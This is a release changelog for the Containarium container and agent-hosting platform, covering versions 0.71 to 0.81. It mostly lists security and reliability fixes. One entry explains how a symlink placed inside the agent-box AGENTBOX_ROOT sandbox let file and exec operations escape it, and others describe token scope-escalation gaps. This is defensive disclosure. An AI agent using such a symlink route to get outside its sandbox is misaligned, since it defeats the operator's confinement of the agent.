- **`Collaborator.ssh_public_keys`** (repeated) on the collaborator
  response. The response side previously packed every authorized key
  into the single `ssh_public_key` scalar, newline-joined; that
  deprecated scalar now carries just the first key — a real single key,
  matching how the request side's deprecated scalar already behaves.
  (#1144, #1911)
- **`add_collaborator`, `list_collaborators` and `remove_collaborator`
  MCP tools** — thin wrappers over the same collaborator endpoints the
  CLI and web UI already call, scoped `containers:write` / `containers:read`
  like any other container operation. (#1912)
- **Optional GitHub-direct daemon self-upgrade by tag.**
  `TriggerUpgradeRequest.github_tag` (CLI: `containarium backends upgrade
  --github-tag <tag>`) makes the daemon download its release binary
  straight from GitHub Releases, verify it against `SHA256SUMS.txt`,
  smoke-test it and atomically swap it in behind the same watchdog the
  sentinel-served path uses. It has no sentinel dependency, so a daemon
  with no sentinel configured can still self-update. Opt-in: an empty
  `github_tag` leaves the existing upgrade path unchanged. (#1028, #1913)

### Fixed

- **`TriggerUpgrade` no longer rejects silently when the daemon has no
  auto-updater configured.** The request did reach the target daemon,
  which refused it without logging anything, so the failure looked like
  a routing problem upstream. The rejection is now logged and the error
  names the missing flag. (#1909)

## [0.81.2] - 2026-09-18

### Fixed

- **Fleet-wide `GetMetrics` and `ListContainers` no longer silently drop
  a backend's data when the sentinel marks its peer unhealthy for even
  one poll tick** — a transient health blip (a peer mid-restart, a
  tunnel reconnect) made every container on that backend render as
  blank stats or vanish from the fleet list entirely, indistinguishable
  from "this backend genuinely has none." Both responses now carry an
  `unreachable_backends` field (backend ID + reason) so callers can tell
  the two apart. (#1901, #1903, #1902, #1904)
- **Lifecycle operations on a container hosted on a currently-unreachable
  backend no longer report it as "not found."** `DeleteContainer`,
  `StartContainer`, `StopContainer`, `ResizeContainer`, `CleanupDisk`,
  single-container `GetMetrics`, the collaborator RPCs, `DebugContainer`,
  and `TriggerClamavScan` all shared the same underlying gap
  (`FindContainerPeer` returning a bare `nil` for "unhealthy peer" and
  "not on any peer" alike) — a real, existing container could be
  misreported as gone during a transient backend blip. (#1905, #1906)
- **`pool join` no longer warns about a missing sentinel auth secret
  when one is already durably provisioned** via an existing
  `EnvironmentFile=` drop-in, and no longer silently drops the
  reference to that file on a re-join without the flag/env var passed.
  (#1895)
- **Container create only waits for cloud-init when the base image
  actually ships it** — the default `images:ubuntu/24.04` base doesn't
  include cloud-init, so every create paid a fixed 5s dead wait for
  nothing. (#1896)

## [0.81.1] - 2026-09-17

> Supersedes the broken `v0.81.0` tag, which was cut without this
> CHANGELOG section or the `pkg/version/version.go` bump the release CI
> requires — its release build failed the `verify-release` gate before
> publishing anything. No artifacts were ever published from `v0.81.0`;
> this is the real 0.81 release.

### Added

- **App-hosting warns when a DNS-01 subject's zone isn't in the credential's
  scope**, instead of only discovering the mismatch when the ACME challenge
  itself fails. (#1891)

### Fixed

- **`egress-via-client` start/stop now requires tenant ownership** — the
  RPC accepted any caller's tenant ID without checking it against the
  caller's own tenant, letting one tenant start or stop another tenant's
  egress proxy. (#1890)
- **An invalid Kubernetes tenant name is now rejected early, with a clear
  error**, instead of failing opaquely deeper in the k8s backend. (#1889)
- **A tunnel token persist failure is now a hard error, not a warning** —
  silently continuing left the sentinel and the primary disagreeing about
  the token that had actually been persisted. (#1888)
- **Idle read deadlines now close vanished-peer sentinel connections**,
  instead of leaving them open indefinitely once the peer is gone. (#1887)
- **`SaveConnection` actually deduplicates by flow ID** — traffic-flow
  records were being double-recorded. (#1886)
- **A peer-forwarded `StartContainer` now stamps `LastStartedAt` too**,
  matching the locally-started path. (#1885)
- **ZAP/pentest `MarkResolved` now scopes to its own scan run**, instead of
  marking findings resolved fleet-wide. (#1884)
- **`DeleteVM` now retries through Incus's transient running-state race**
  instead of failing on a VM that is mid-transition. (#1883)
- **App TLS-subject reconciliation now checks live Caddy routes, not just
  `dbRoutes`**, closing a gap where a route removed outside the DB record
  kept its TLS subject around. (#1881)
- **VM primary-IP selection now excludes k3s's own `cni0`/flannel
  bridges**, which could otherwise be picked over the VM's real primary
  interface. (#1879)
- **The agent run lease now records the workspace before the git fetch
  attempt, not after** — a fetch failure previously left the lease with no
  workspace recorded at all. (#1875)

### Internal

- e2e: sweep leftover cluster instances pre-flight, not just on exit. (#1877)

**Full diff**: https://github.com/FootprintAI/Containarium/compare/v0.80.1...v0.81.1

## [0.80.1] - 2026-09-16

### Fixed

- **A tunnel-promoted primary could register successfully in the sentinel's
  `PrimaryRegistry` and still 502 for a declared alias.** `--public-aliases`
  only tells the sentinel which SNI hostnames route to a primary's tunnel —
  it's still the primary's own Caddy that has to be configured to serve
  each one, and nothing verified that second half of the contract. A new
  end-to-end reachability probe (`checkTunnelPrimaries`) dials each
  tunnel-backed primary's Hostname/Aliases through the same path the SNI
  router uses, completes a real TLS+HTTP round trip, and treats a 502 as
  unreachable, recording per-hostname results (`AliasHealth`) visible via
  `GET /sentinel/primaries`. (#1872, #1873)

- **The "Managed clusters KVM e2e" lane failed 100% of the time since
  2026-09-13**, looping on Incus's `VM agent isn't currently running`
  during cluster provisioning. `IncusHost.WaitReady`'s documented contract
  says it waits for the guest agent as well as the network, but only ever
  waited for network — the QEMU guest agent connects over a separate vsock
  channel that can lag well behind it on a loaded host, and a failed
  provisioning attempt deleted and recreated the VM every reconcile tick,
  so the race never had a chance to resolve on its own. `WaitReady` now
  waits for both, sharing the caller's single timeout budget. (#1862,
  #1863)

- **`TestStatus_ReportsReadyWarmingAndMinWarm` was flaky (~50% failure
  rate)** because `warmOne` committed a warmed member's ready-ring append
  and its `warming--` decrement in two separate mutex sections, so a
  concurrent `Status()`/`ReadyCount()` read could transiently double-count
  a still-settling member. Both updates now commit under one lock
  acquisition. (#1856, #1857)

- **A failed audit-log write was logged and otherwise untracked.** All
  three async audit writers (HTTP middleware, gRPC interceptor, event
  subscriber) persist off the request path so a slow or unavailable
  audit store never adds latency to — or fails — the action being
  audited; but that meant a write failure (the store returning an
  error, or a full buffered channel dropping an entry before the store
  was even called) was previously visible only as a `log.Printf` line
  in the daemon's stdout. A row that was never written is otherwise
  undetectable — nothing else notices its absence. Both failure modes
  now increment a shared counter, reported via the new admin-gated `GET
  /v1/audit/health` (same auth gate as the existing `/v1/audit/logs`:
  admin role or `audit:read` scope).

- **agent-box's `AGENTBOX_ROOT` sandbox boundary was a lexical prefix
  check with no symlink resolution.** `validatePathCtx` compared
  `filepath.Abs` + `filepath.Clean` of the requested path against the
  sandbox root — neither touches the filesystem, so a symlink placed
  anywhere inside the root and pointing outside it passed the check even
  though the actual read/write/exec on that path follows the symlink at
  the OS level and escapes the sandbox. The boundary comparison now
  resolves symlinks on both sides (a new `resolveSymlinks` helper that
  tolerates a not-yet-existing leaf, so `write_file` creating a new file
  still works) before comparing. Applies to both the `AGENTBOX_ROOT`
  floor and the MCP client-advertised-roots fallback.

- **`AddRoute`/`UpdateRoute` could silently repoint a hostname another
  creator already owned.** `RouteStore.Save` was an unconditional upsert
  by `full_domain` with no comparison against the existing route's
  `created_by` — an admin (or an automated reconciliation path) naming a
  hostname that already routed to another tenant's container would
  silently steal that traffic. `Save` now refuses with
  `ErrRouteOwnershipConflict` (surfaced as gRPC `AlreadyExists`) when
  `full_domain` belongs to a different creator, inside the same
  transaction as the upsert so two concurrent Saves can't race past the
  check. Routes written before this existed (`created_by` empty) are
  exempt from the refusal so the upgrade can't lock anyone out, but the
  first post-upgrade touch backfills the owner so the hostname is
  protected from then on. `AddRoute`/`UpdateRoute` now also record the
  authenticated admin as `created_by`, which they previously left blank.

- **Refresh-token rotation could be exchanged more than once under a race,
  contradicting the documented single-use contract.** `RefreshToken`
  minted the new `(access, refresh)` pair before revoking the presented
  jti; two concurrent exchanges of the same refresh token could both pass
  validation and both walk away with a valid new pair. Revocation is now
  an atomic claim performed *before* minting — `RevokeClaim` reports
  whether a given call was the one that actually recorded the jti as
  spent, so only the caller that wins it may mint. Reuse of an
  already-rotated refresh token — whether from a losing concurrent racer
  or a genuine stolen-token replay, the two are indistinguishable from
  the server's side — now revokes the entire rotation family, so every
  token descended from that login stops working rather than leaving a
  narrower race window open.

### Added

- **`RunAgentSkill` accepts a git source/ref**, fetched into the run's
  workspace after seeding succeeds (so a fetch failure still has a
  fully-formed, end-able lease to clean up); reported back as
  `git_commit`/`workspace_path`. (#1859, #1864)
- **Per-run seed directory and workspace**, removed when the run's lease
  ends — replaces the single box-level seed path so a crew member or
  queue worker sharing a box with a one-off run no longer has its files
  deleted when that unrelated run's lease ends. (#1860, #1865)
- **Hook-mode + keep-N retention in the scheduled backup runner**
  (`scripts/backup-all-tenants.sh`): accepts `--hook <path>` tenant config
  lines alongside plain `pg_dump`, and switches retention from
  delete-then-create to `backup prune --keep N` run only after a
  successful create, so a failed backup can no longer leave a tenant with
  zero backups. `restore-tenant.sh` gains `--id` to target a specific
  backup once more than one exists. (#1839, #1853)
- **`GET /v1/audit/health`** reports `persistFailureCount` and
  `persistFailureSince` — see above.

## [0.79.2] - 2026-09-14

### Added

- **Real client IP behind a CDN: `--client-ip-header` + `--trusted-proxy-cidrs`**
  (#1829). When an app-hosting daemon sits behind a CDN that terminates the
  client connection (e.g. a Cloudflare-proxied hostname), the visitor's IP
  arrives in a header such as `CF-Connecting-IP`, not in the PROXY-protocol
  source — so every container saw the CDN edge IP. The daemon now emits Caddy's
  `client_ip_headers` and unions the CDN's published ranges into
  `trusted_proxies`, so the header is honored only from the CDN's own networks.
  The PROXY-protocol allow list is deliberately **not** widened (a CDN never
  sends PROXY headers; widening would let an edge forge a source). The
  configuration is remembered and re-applied by the stub-revert self-heal
  (same path as #400), closing the durability gap where a daemon or Caddy
  restart silently dropped a hand-patched config. Independent of
  `--proxy-protocol`; wildcards and malformed CIDRs are refused at startup.
  See `docs/PROXY-PROTOCOL.md` → "CDN-fronted hosts".

- **Backup retention/pruning** (#1839). `containarium backup prune <user>
  [--database db] --keep N` deletes older backup records, keeping only
  the newest N per (username, database) — or per (username, label) for a
  `--hook` backup, since a hook backup's label fills the same slot. Omit
  `--database` to prune every database the tenant has backups for, each
  independently. One record's delete failure (e.g. a transient
  object-store error) never aborts pruning the rest. This was the
  missing half of a scheduled backup (#1831, #1836): a schedule that
  only ever creates and never prunes fills its backup directory or GCS
  bucket without bound. Lands as `PruneBackups` on `BackupService`
  (proto-first, REST via grpc-gateway); deliberately not exposed as an
  MCP tool, same as `backup delete`.

## [0.79.1] - 2026-09-14

### Added

- **Tenant self-registered backup recipient** (#1836). A tenant can
  `secrets set <user> CONTAINARIUM_BACKUP_AGE_RECIPIENT age1...` once and
  every later `backup create` with no `--age-recipient` flag encrypts to
  it automatically — the missing piece for a *scheduled* backup, which
  has no operator present to pass the flag on each run. An explicit
  `--age-recipient` on a call still overrides the registered one; neither
  a tenant with nothing registered nor a standalone daemon (no secrets
  store) is an error — both mean plaintext, unchanged from before. The
  value rides the existing tenant-scoped Secrets API (versioned, audited,
  eligible for the tenant's own KMS-backed KEK) rather than a new config
  mechanism; the matching private identity is never registered this way
  and never touches the platform.

## [0.79.0] - 2026-09-13

Credential-less, tenant-encrypted database backups for multi-tenant fleets.

### Added

- **Credential-less backup hook + user-held dump encryption** (#1831).
  `containarium backup create` gains two composable, opt-in options for
  multi-tenant deployments. `--hook <abs-path>` runs the tenant's own
  program inside the container and captures its stdout as the dump, so no
  DB credential ever crosses to the platform (and databases nested inside
  an in-container Docker stack become backup-able). `--age-recipient age1…`
  encrypts the dump in-process to a user-held age key before it is staged
  or uploaded, so the daemon's disk, the object store and the operator only
  ever hold ciphertext; the SHA-256 integrity gate covers the stored
  ciphertext and is checked before decryption. `backup restore` on an
  encrypted record requires `--age-identity-file` (per-call, never stored).
  Hook dumps are opaque and are stored/listed/fetched but not auto-restored.
  Plaintext `pg_dump` backups are byte-for-byte unchanged. New dependency:
  `filippo.io/age` (pure Go). See `docs/DB-BACKUP-OPERATIONS.md`.

## [0.78.1] - 2026-09-13

Execution-scoped authorization: a skill run's credentials now die with the
run. Supersedes burned v0.78.0 — that tag's `release.yml` build failed its
own version/changelog check (this entry and the version-constant bump are
the fix); its other three publish workflows had already gone out under
`v0.78.0` by the time the check caught it, so that tag stays and this one
carries the release. Design: `docs/architecture/execution-scoped-authorization.md`
and PRD: `docs/product/execution-scoped-authorization.md`, both in
FootprintAI/Containarium-cloud.

### Added

- **`RunAgentSkill` holds a credential lease for every run and ends it on
  exit.** Both the delegated platform JWT and the model-gateway token
  minted for a skill run are revoked and wiped from the box the moment the
  run returns — on success, on an agent error, and on a cancelled caller
  alike — instead of living out their full 30-minute TTL after the run has
  already finished. (#1826)
- `RunAgentSkillRequest`/`Response` and `StartAgentWorkerResponse` carry a
  `run_id` — caller-supplied or generated — bound into both credential
  types' claims, so a leaked or misused token can be traced back to the
  run that minted it. (#1824, #1826)
- `internal/runlease`: the reusable primitive behind the lease — revoke
  every credential, then wipe the seed files, with per-step timeouts and a
  measured worst case. (#1823)
- `containarium audit query --run-id <id>` finds a run's
  `agent.run_lease_issue` / `agent.run_lease_end` audit rows. (#1825)
- `model-gateway`: an in-memory revocation store and an opt-in
  `POST /__gateway/revoke` admin endpoint, so the gateway can run and
  revoke tokens standalone, without the daemon's Postgres-backed store.
  Published as its own image, `ghcr.io/footprintai/containarium-model-gateway`.
  (#1827)
- `scripts/agent-skill-lease-e2e.sh`, wired into `cluster-e2e.yml`: proves
  in CI that a run's gateway token is refused within milliseconds of the
  run returning (measured 9–18ms against a 5000ms budget), and fails red
  if a run's credentials are ever left unrevoked or revoked too late.
  (#1828)

## [0.77.0] - 2026-09-13

### Added

- **BYOC host security posture, now loud at enrollment time** (#1103,
  #1808). `cloud enroll` and `pool join` print the same advisory "Host
  security posture" section `containarium doctor` already renders (disk
  encryption, Secure Boot, sshd hardening, auditd, unattended upgrades,
  metadata reachability, tunnel-token exposure), at the moment a host
  actually joins — previously only discoverable later via a separate
  `doctor` run or the cloud webui's per-host badges. Published
  `docs/security/BYOC-HOST-HARDENING-BASELINE.md` as the customer-facing
  form of the check table; advisory only, does not block enrollment.
- **Metadata-endpoint block, unconditional, for every enrolled/joined
  host** (#1103, #1810, #1811). `cloud enroll` and `pool join` now
  insert an idempotent `iptables` FORWARD rule blocking the container
  bridge's traffic to the cloud metadata endpoint (`169.254.169.254`) —
  closing the pivot from a compromised tenant workload to instance
  credentials — and install a systemd unit so the rule survives a
  reboot. Deliberately narrower than the full eBPF network-policy engine
  (no capacity/incident risk on small hosts); scoped to forwarded
  container-bridge traffic only, so host-level cloud tooling (guest
  agent, `gcloud`, disk-resize scripts) is unaffected. **No opt-out** —
  this is the control that stops a tenant pod from reaching the host's
  cloud identity, so neither command lets it be consciously disabled. A
  genuine environment failure (missing `iptables`, bridge not yet
  created, nftables-only host) is still only a printed warning, never a
  blocked enroll/join. A hidden `containarium hostharden block-metadata
  <bridge>` subcommand exists for manual re-application.

### Fixed

- **Release build's `buf` install broke on any upstream `buf` release
  requiring a newer Go than this repo pins** — `go install
  .../buf@latest` failed with `buf@v1.73.0 requires go >= 1.26.7
  (running go 1.26.6)`, caught rehearsing this very release. Replaced
  with a pinned, checksum-verified `buf` release binary download in
  `release.yml`, which has no dependency on the runner's Go toolchain.

## [0.76.2] - 2026-09-11

### Fixed

- **`POST /v1/backends/upgrade` (`TriggerUpgrade`) 404'd over HTTP/REST on
  every version that has shipped it** (#1805) — `containarium backends
  upgrade --http` and the MCP `upgrade_backend` tool were both broken, with
  no working fallback (the CLI's upgrade subcommand hardcodes an HTTP URL
  regardless of `--server` scheme, so there was no gRPC escape hatch
  either). `http.ServeMux`'s longest-prefix-wins rule routed the request
  into the legacy `/v1/backends/` subtree handler (kept around for the
  per-backend `/system-info` forward), which 404s anything it doesn't
  recognize, instead of the exact-path grpc-gateway route the RPC needed —
  a gap left over from when `/v1/backends` was promoted to proto-first
  (#354) without accounting for later sub-routes. Registered as its own
  exact path now, same pattern as the existing `ListBackends` entry.

## [0.76.1] - 2026-09-10

### Added

- **VM serial console access for BYOC hosts** (#1753, #1755, #1757, #1764).
  Incus's console ring-buffer log is now exposed via `GetConsoleLog`, plus a
  live interactive attach to a VM instance's serial console. A
  console-multiplex agent on VirtualBox-hosted BYOC hosts and a sentinel
  console router make the console reachable from outside the host's own
  network, matching the reachability box owners already have for LXC
  containers.
- **DNS-01 provider credential verification** (#1740). Beyond checking a
  credential is present and propagated, the daemon now authenticates it
  against the provider's own API before relying on it for issuance.
- **CLI split into `containarium` (client) and `containariumd` (server)**
  (#1788-#1795, #1797, #1798, #1800). Server-only code is now build-tag
  isolated from the client binary, enforced by new CI gates (dependency
  graph, command-tree allow-list, parity between the two tag sets). The
  release workflow now publishes `containariumd-*` and continues to mirror
  `containarium-*` for compatibility; startup/deploy/install scripts and
  collaborator commands were flipped to the split binaries.

### Fixed

- **`su`-based shell diagnostics reported a bare permission error instead of
  naming the missing account** (#1487, #1768, #1771). The debug path now
  distinguishes a missing host account from a missing in-container account
  and names which one is absent.
- **DNS-01 provider credentials never reached Caddy's own process
  environment on some ordering** (#1738), addressed alongside the
  verification work above.
- **New secrets could still land as `env` delivery in one path** (#1741);
  default is now `file` delivery.
- **CPU admission check-then-act race** (#1742) closed in the server's
  admission path.
- **Caddy's HTTP server could reclaim `:443` from an active L4
  SNI-passthrough server** (#1744) under a second ordering not covered by
  the v0.75.0 fix.
- **`namespace.yaml`** in the Helm chart is now guarded on
  `gateway.enabled` (#1746), avoiding a namespace resource when the
  gateway is disabled.
- **`ListContainers` bypassed the `box.BoxBackend` seam** (#1747), now
  dispatched through it like the rest of the container RPCs.
- **Hypervisor agent's handshake reader could silently swallow console
  input** (#1758) on the new VM console path.
- **`/terminal` WebSocket route on the gateway had no tenant check**
  (#1765), allowing a request to reach a terminal session it shouldn't.
- **`traffic_aggregates` rows were never cleaned up** (#1770); cleanup now
  removes stale rows alongside the raw flow data it already pruned.

### Documentation

- Console access design for BYOC VM hosts (#1748).
- README shows the `--http --server` form of ssh-config sync (#1767).
- Architecture design for splitting the CLI into `containarium` (client)
  and `containariumd` (server) (#1769).
- Operator docs and runbooks updated to reference `containariumd` for
  on-host commands (#1799).

### Internal

- Dependency bumps: `sigs.k8s.io/controller-runtime` 0.24.1→0.25.0,
  `github.com/mark3labs/mcp-go` 0.58.0→1.0.0, `google.golang.org/api`
  0.294.0→0.297.0, `sigs.k8s.io/agent-sandbox` 1.0.0→1.0.1 (#1759, #1760,
  #1762, #1763).

**Note:** `v0.76.0` was tagged without the required version-bump commit and
its release-notes build failed before publishing a GitHub Release. Its
build/image/PyPI workflows had already fired and published under that
version number by the time the mistake was caught (PyPI does not allow
re-uploading a burned version — see `docs/RELEASE-PROCESS.md`). The tag is
left in git history as dead, matching the `v0.48.0` precedent; this
release supersedes it and is otherwise identical in scope.

## [0.75.0] - 2026-09-06

### Added

- **gRPC audit interceptor** (#1605). `audit_logs` was fed by exactly one
  writer — the HTTP/grpc-gateway middleware — so an RPC served on the native
  gRPC port produced no audit row while the identical RPC served over REST
  produced one. A new interceptor covers the native gRPC server too, deduped
  against grpc-gateway's in-process forwarding so a REST call still produces
  exactly one row.
- **DNS-01 provider credential verification** (#1739). Beyond checking a
  credential is present and propagated, the daemon now authenticates it
  against the provider's own API (Cloudflare's `/user/tokens/verify` today) —
  a credential can be present, non-empty, and still revoked or wrong.

### Fixed

- **Sentinel admin sshd host key regenerated on every restart** (#1596),
  degrading `StrictHostKeyChecking` from a real MITM signal into routine
  noise and breaking non-interactive tooling. The key is now generated once
  and persisted, the same pattern already used for sshpiper's own host key.
- **`ensureDNSIssuers` replaced a policy's whole issuer array** instead of
  repairing it in place (#1671), silently discarding `external_account`
  (EAB), `trusted_roots_pem_files`, and any hand-set issuer config the
  moment DNS-01 needed adding. Now repairs each ACME issuer in place; a
  non-ACME issuer (e.g. `internal`) is left untouched entirely.
- **DNS-01 provider credentials never reached Caddy's own process
  environment** (#1597). Caddy runs in its own container; the daemon built
  it with the right module and emitted the right `{env.CF_API_TOKEN}`
  placeholder, but nothing ever set that variable where Caddy could see
  it — regardless of whether it was correctly configured on the daemon's
  side. The credential is now propagated into Caddy's systemd environment,
  with a clear error when it resolves empty.
- **Secrets defaulted to `env` delivery** (#1604) — readable by any
  same-container process via `/proc/<pid>/environ`, and printed in
  cleartext by `incus config show` regardless of at-rest encryption. New
  secrets now default to `file` delivery (tmpfs, absent from the Incus
  config entirely); `env` remains fully supported via `--delivery env`, and
  existing secrets keep whatever mode they were written with.
- **CPU admission check-then-act race** (#1588). Two concurrent
  creates/resizes against the same host could each admit against a stale
  committed-cores snapshot and jointly exceed the overcommit ceiling. An
  admitted request now reserves its cores for the duration of the caller's
  mutation, closing the race across create, resize, and cluster-node
  provisioning.
- **Caddy's HTTP server could reclaim `:443` from an active L4
  SNI-passthrough server** (#1743), producing two servers bound to the same
  port and ~50% intermittent TLS handshake failures on passthrough
  hostnames — silent at the application level and easy to mistake for
  client/network flakiness. The HTTP server's listen list now checks L4's
  live state and excludes `:443` while L4 owns it.

### Internal

- CI now runs a regression test for the Makefile variable-injection class
  of bug the v0.74.0 release fixed (#1732).

## [0.74.0] - 2026-09-05

Six of the seven changes here are security fixes. The three ungated-RPC
findings were reachable on every release up to and including v0.73.0.

### Security

- **ComposeAutostartService let any caller act on ANY tenant's box** (#1716).
  All four handlers took `_ context.Context` — the tell that they could not
  have checked anything — then passed the caller-supplied `username` straight
  to a command exec'd inside that tenant's box. Any caller reaching the gRPC
  surface could name any tenant and enable or disable compose autostart in
  their box, or read what stacks they run.

  Reads now take `containers:read`, mutations take `containers:write`, and all
  four check `AuthorizeTenant` against the username. `Disable` is the direction
  worth naming: removing autostart from someone else's stack is silent until
  their services fail to come back after a reboot.

- **The fleet-wide threat blocklist could be mutated by anyone** (#1717).
  `AddBadDestination`/`RemoveBadDestination` had no guard at all. They now
  require `security:write` **and** the admin role — this is platform config,
  not tenant data. Adding a bad CIDR is a nuisance somebody notices; removing
  one quietly disables a detection rule and nothing looks wrong afterwards.

- **Nine read-only RPCs returned platform config with no guard** (#1718).
  Each now takes the read scope its own file already uses. Most are close to
  public already, but the ones that matter disclosed which security tooling is
  enabled and configured: whether pentesting and ZAP run and with which
  scanners, whether the eBPF sentry is up and if not why, whether an alerting
  webhook secret exists, and what the blocklist watches for.

- **An empty scopes claim read as UNRESTRICTED** (#1722). A carried-but-empty
  metadata value returned `(nil, false)`, and nil means "no restriction" — so
  "this credential holds nothing" and "this credential is unrestricted" gave
  the same answer, the permissive one. The context-value path never had the
  bug, so the two transports disagreed about identical input.

  Not reachable in production: every writer guards on `len(scopes) > 0` and
  the mint omits the claim entirely for zero scopes. The real harm was in
  tests — an assertion written as "a caller with no scopes is denied" passed
  whether or not the guard under test existed.

- **Two script-injection surfaces in the release workflow** (#1602). `Create
  release notes` and `Assemble bundle tarball` interpolated
  `${{ github.ref_name }}` directly into `run:` blocks. Git permits shell
  metacharacters in tag names, and Actions splices the value in textually
  before the shell parses it. Both now route it through `env:`.

### Added

- **Every registered RPC is asserted to carry an auth guard** (#1685). An AST
  scan over the registered services fails the build when a handler has no
  `auth.Require*`/`AuthorizeTenant` call and no documented exemption. This is
  the systematic half of the three findings above: without it, a forgotten
  guard is *ungated*, not denied, and nothing says so.

- **The audit hash chain's root is anchored outside the database** (#1706).
  Until now a privileged rewrite of the audit log was undetectable, because
  the only copy of the chain's root lived in the same database as the rows it
  attests to.

### Docs

- Vulnerability reports route to `security@containarium.dev`, and the policy
  now states explicitly that it binds maintainers and internal audits too —
  this repository is public, so an issue describing an unguarded code path is
  a disclosure regardless of who opened it.

## [0.73.0] - 2026-09-04

### Security

- **An exchange granting nothing minted an UNRESTRICTED token** (#1713).
  `ExchangeDelegatedToken` computed the scope intersection correctly, reported
  it honestly, and then handed back a token that ignored it.

  The trap is the claim shape. `HasScope` treats an **absent** scopes claim as
  "no restriction", and the generator omits the claim entirely when handed zero
  scopes. So an empty grant does not mint a powerless token — it mints an
  unlimited one. A caller holding only `tokens:delegate` could request
  `secrets:read`, be correctly granted nothing, and receive a token that passes
  `RequireScope` for every scope in the system.

  That is the escalation #1676 closed, reopened by the endpoint added in
  v0.72.0 to close it on the cloud path. An exchange that would grant nothing
  is now refused rather than minted: there is no way to express "no authority"
  in this claim, and a token genuinely carrying zero scopes could not be used
  for anything anyway.

  Reaching it required holding `tokens:delegate`, which is granted deliberately
  and in practice only to the cloud control plane — which does not call the
  endpoint yet. The window was one release.

  The test that should have caught it asserted on the response's
  `granted_scopes` field, which was correct and said `[]`. The assertion was on
  the report rather than the credential. It is replaced by tests that inspect
  the minted token.

### Added

- **Delegated tokens carry roles, intersected with the caller's** (#1714).
  A delegated token was minted with no roles at all, so it failed every one of
  the 111 handlers gated on `RequireRole(admin)` and every cross-tenant
  `AuthorizeTenant` path. The scope half worked; without roles the token could
  not do the job the endpoint exists for.

  Roles now follow the same rule as scopes — intersected with the caller's,
  never unioned — with one deliberate difference. An absent **scopes** claim
  reads as unrestricted, which is why an empty scope grant is refused. An
  absent **roles** claim reads as no roles at all, so empty is already the safe
  state; the only way to get roles wrong would be to inherit admin silently.
  An empty roles request therefore grants none, and a caller that needs a role
  names it.

  `IntersectRoles` is deliberately not `IntersectScopes` with different
  arguments: that function treats a nil caller as "no ceiling", which is right
  for scopes and would let a caller holding **no roles** mint an admin token.
  The two agree on every case where the caller holds something, so only a
  role-less caller distinguishes them — and there is a test for exactly that.

  `containarium token delegate` gains `--roles`.

## [0.72.0] - 2026-09-04

### Added

- **Mint a token that acts FOR another subject** — `POST /v1/tokens/delegate`,
  `containarium token delegate` (containarium-cloud#1427). A service that
  fronts this API for end users presents its own credential on every call, so
  #1676's rule that an agent token is bounded by the caller's scopes binds
  nothing when that caller is a shared service account, and #1678's audit
  `actor` records the service rather than the person who asked.

  `act` is a JWT claim and never a header (#1677), so the fronting service
  cannot fix this itself: it holds no signing key, and handing it one would let
  it mint any identity at all. It asks the daemon to mint instead.

  Three invariants make that safe. Granted scopes are the **intersection** of
  the caller's with those requested, so an exchange can only narrow authority.
  `act` is built server-side from the authenticated caller and **wraps** the
  caller's existing chain, so a multi-hop delegation nests rather than
  flattening and `RootActor` still resolves to the human furthest from the
  leaf. And it is gated on a new `tokens:delegate` scope, deliberately not
  `tokens:write` — managing your own tokens and acting as another person are
  different capabilities.

  Unlike every other RPC, this one fails **closed** on a token carrying no
  scopes claim, whatever `CONTAINARIUM_STRICT_SCOPES` is set to. Elsewhere that
  claim is optional for backward compatibility (#1679) and safely so, because
  the token's own authority still bounds a read or a mutation. Here the
  caller's scopes *are* the ceiling being applied, and an absent claim would
  mean no ceiling.

### Fixed

- **Sentinel logged a bind failure on every tunnel connect and reconnect**
  (#1710, #1711). Any non-primary backend advertising the sentinel's HTTPS port
  tried to open a per-spot loopback listener there, which the ConnMux's
  wildcard listener on that port makes impossible. The exemption existed but
  only covered tunnel-promoted primaries. HTTPS for every backend already
  routes through `DialTunnel()` via the SNI router, so the listener was
  dead-on-arrival in all cases; the exemption now covers every backend, and the
  sentinel's configured `--https-port` is threaded through instead of relying
  on a promoted primary's `PublicPort` matching it by coincidence.

### Internal

- **A release tag whose changelog and version constant disagree with it now
  fails** (#1705). Two documented conventions that nothing enforced, each of
  which had already failed silently three times: a `CHANGELOG.md` missing the
  release it ships, and `pkg/version/version.go` left stale — 0.68, 0.69 and
  0.70 all shipped with the constant reading 0.67.0. Both are one grep. A
  failure here costs a re-tag; not checking costs a published release that
  misrepresents itself, which cannot be taken back.

## [0.71.0] - 2026-09-04

### Added

- **`containarium code` — run a coding agent ON a box, not on your laptop**
  (#1672, #1673, #1674). `code install` lands the Claude Code toolchain on a
  box you already use, credential delivered via the secrets store so no
  interactive login happens in a headless box. `code run` then starts the agent
  **detached** and streams its output back.

  It streams like a pipe but deliberately is not one: the run lives on the box
  with its output captured to a log, and the terminal is a *resumable reader*
  over that log. Close the laptop, lose wifi, Ctrl-C — the run continues, and
  `code attach` resumes **byte-exact**, nothing missing and nothing repeated.
  Verified live at 132,000 bytes across 25 forced mid-run disconnects.

- **`code_run` / `code_attach` / `code_status` / `code_stop` MCP tools**
  (#1698). The CLI verb shipped without an MCP counterpart, so an agent could
  create a box but not start a coding run on one. MCP is request/response, so
  these return a bounded output window plus `next_offset` — carrying that
  offset forward is what makes an agent's reconnect lossless, the same property
  the CLI gets from streaming. Scoped `code:write`: starting a run executes
  arbitrary code on the box.

- **Durable run records in `agent-box`** (#1672). A run's identity and outcome
  now persist beside its log, so a *different* agent-box instance — after a
  reconnect — can still answer "is it alive?" and "how did it end?". Records
  carry a boot id, so a PID the kernel may have reassigned across a reboot is
  never mistaken for a live run.

- **Runs record who authorized them** (#1699). A detached agent run holding a
  credential previously recorded who it ran *as*, never who *started* it.
  Deliberately caller-asserted and labelled as such everywhere it appears —
  agent-box has no authenticated context on either transport, so this is
  weaker evidence than an audit row and must not be read as equivalent.

### Fixed

- **A detached run's exit status is no longer lost when the connection drops**
  (#1693). The status was written by a goroutine inside agent-box, which dies
  with its SSH connection — so *every* detached run reported `unknown` forever,
  precisely the case durable records exist for. The child outlives the
  connection, so the child now records its own outcome. A run killed outright
  still reports `unknown`: an OOM must stay distinguishable from a clean exit.

- **Framed capture no longer kills the run it is streaming** (#1701).
  `--output-format stream-json` set `cmd.Stdout` to an `io.Writer` rather than
  an `*os.File`, so `os/exec` inserted a pipe and a copier goroutine inside
  agent-box; when the connection dropped, the child died of SIGPIPE on its next
  write. Framing moved to the child's side of the fork, so a framed run now
  survives a disconnect exactly as a combined one does.

- **`ssh-config sync` will not wipe a working config with a zero-host run**
  (#1695). Both the CLI and the MCP tool overwrote `~/.containarium/ssh_config`
  with an empty file — and reported success — when the control plane returned
  no containers. A zero-host result is far more often an expired credential or
